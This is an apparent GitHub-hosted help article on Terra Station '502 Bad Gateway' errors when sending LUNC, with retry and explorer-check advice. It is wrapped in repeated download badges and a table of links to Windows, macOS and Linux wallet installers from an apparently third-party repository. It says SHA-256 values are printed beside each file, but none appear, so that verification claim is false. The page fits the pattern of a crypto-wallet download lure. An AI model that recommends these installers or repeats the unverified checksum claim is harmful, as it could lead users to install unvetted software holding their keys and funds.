![Terra Station Wallet](assets/banner-article.png)

# 502 Bad Gateway When Sending LUNC

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`terra-station-wallet-windows-v2.5.13.exe`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-windows-v2.5.13.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | [`terra-station-wallet-macos-v2.5.13.dmg`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-macos-v2.5.13.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`terra-station-wallet-linux-v2.5.13.zip`](https://github.com/terraclassic-wallet/terra-station-wallet/releases/download/v2.5.13/terra-station-wallet-linux-v2.5.13.zip) |

</div>

Every file in that table is attached to the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), and the SHA-256 printed beside each name is the value published here.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

A 502 means the node the app was talking to did not return a usable answer: the request reached a gateway, and the gateway could not complete it against the chain service behind it. Your LUNC is untouched, no transaction is created by the failed attempt, and the fix is almost always a short wait followed by one retry.

## What the error is telling you

Every balance read and every broadcast passes through an endpoint that sits between the app and Terra Classic. A 502 is issued by that middle layer, not by the chain: it says the service handling your request failed to respond properly. Nothing was signed into a block, and nothing was lost.

That distinction answers the usual worry immediately. A failed gateway request is a plumbing fault, and plumbing faults do not move funds.

## Is my balance safe right now

Yes. The balance is a property of your address on Terra Classic; the app's ability to read it changes nothing about it. Two checks make that concrete:

- Open the address on a block explorer and confirm the balance is still there - https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-classic-explorer.md shows where to look.
- Look for the transaction in the explorer's history. If it is absent, it was never broadcast.

If the explorer shows the transaction, the 502 arrived after the broadcast and a retry would risk sending twice. That check is worth the twenty seconds.

## What to do

1. Wait a minute or two. Gateway failures are usually brief.
2. Check the explorer before doing anything else, so you know whether a transaction exists.
3. Retry once, if and only if nothing appears in the history.
4. If the retry also fails, leave it. Repeated submissions turn a gateway fault into a rate-limit problem, and *Terra Station Too Many Requests: Causes and Fixes* explains what that looks like.
5. Still failing after a sensible wait? Install the current release (https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), then try once more.

Notice the order: nothing here says "send again immediately". The instinct to retry fast is what turns a one-minute fault into a confusing afternoon.

## Telling the errors apart

| What you see | Who is at fault | Right response |
|---|---|---|
| 502 bad gateway | The endpoint between app and chain | Wait, verify on the explorer, retry once |
| Too many requests | Request volume from your client | Stop, wait for the window to reset |
| Insufficient fees | No liquid LUNC for the network fee | Free a small balance; see *Staked Everything and Cannot Pay Fees to Claim* |
| Fee estimation failed | The app could not price the operation | Update to the current release |
| Transaction pending | Broadcast accepted, confirmation slow | Verify, then wait; see https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-stuck-transaction.md |

Two of those five are about money, three are about plumbing. Reading the message before acting is the whole skill, and it is why the app shows the node's own words rather than a friendly summary.

## If it keeps happening

A 502 that repeats over hours is not a burst; it is an older build meeting a service that has changed shape. Two fixes cover it:

- **Use the current release.** Older builds carry request handling that newer endpoints no longer accept, and the error surfaces as a gateway failure rather than a version complaint.
- **Check the download.** A build installed from anywhere but the release page can be anything, including something that never talks to the chain properly. *Verifying the Terra Station Wallet Checksum* covers the comparison.

If neither changes anything, the fault is chain-side and outside the wallet: https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-not-working.md separates the cases by what the app does rather than by the message it prints.

## How a safe retry looks

A retry is a decision, not a reflex, and it takes four steps in this order.

1. Read the history on the explorer. An existing transaction means stop - the send already happened and a retry would double it.
2. Copy the recipient address from your own record rather than retyping it. Most irreversible mistakes happen on the second attempt, when confidence replaces checking.
3. Submit once, with the same amount and the same recipient. Do not raise the fee to hurry a gateway: the fee is not what failed.
4. Leave it alone for a few minutes. If the screen still refuses, wait longer rather than pressing again.

Two failed attempts in a row is the signal to stop and change approach - check the build you are running, then work through the three-way split in *Terra Station Not Working: Fixes for LUNC Holders*. A third identical attempt adds load and information value of zero.

## What not to do

- **Do not reinstall first.** An uninstall can take app data with it, and if the wallets disappear you will need the phrase - a cost you did not have to pay for a gateway timeout.
- **Do not assume the send failed.** Verify on the explorer. A 502 can arrive after a broadcast succeeded.
- **Do not raise the fee to force it through.** A gateway error is not a fee problem, and a higher fee does not make a node answer.
- **Do not chase it with a support message.** No support process can retrieve, reverse or prioritise a transaction, and any that offers to is in the business of taking a phrase.

## Questions people ask

### Did the transaction go through if I saw a 502?

Usually not, but verify rather than assume. If the explorer shows the transaction, it went through and the error arrived late; if the history is empty, nothing was broadcast.

### Can I lose LUNC to a 502?

No. A failed request creates no transaction. The only risk is human: re-sending after a broadcast that did succeed, which is why the explorer check comes before the retry.

### Should I switch networks or re-import to fix it?

No. A gateway error has nothing to do with your wallet, your keys or the selected network. Changing any of them just adds steps that cannot help.

### How long does it usually last?

Minutes in most cases. A failure that persists for hours points at an old build or an endpoint-wide problem, not at your request - and in neither case does a faster retry help.
